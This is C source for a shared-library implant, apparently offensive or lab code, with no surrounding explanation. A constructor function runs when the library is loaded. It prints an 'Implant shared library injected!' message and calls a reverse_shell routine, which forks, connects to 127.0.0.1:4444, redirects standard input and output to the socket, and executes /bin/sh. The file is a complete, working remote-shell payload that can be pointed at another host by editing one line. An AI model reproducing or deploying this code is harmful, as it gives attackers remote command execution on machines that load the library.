#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

#define IP "127.0.0.1"
#define PORT 4444

int reverse_shell()
{
    if (fork() != 0)
        return 0;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);

    inet_pton(AF_INET, IP, &(server_addr.sin_addr));

    connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    char *argv[] = {"/bin/sh", NULL};

    execve(argv[0], argv, 0);

    close(sockfd);

    return 0;
}

__attribute__((constructor)) void library_init(void)
{
    puts("Implant shared library injected!");
    puts("To list processes with their pid, ppid, cmd, use \"ps -eo pid,ppid,cmd\"");
    reverse_shell();
}
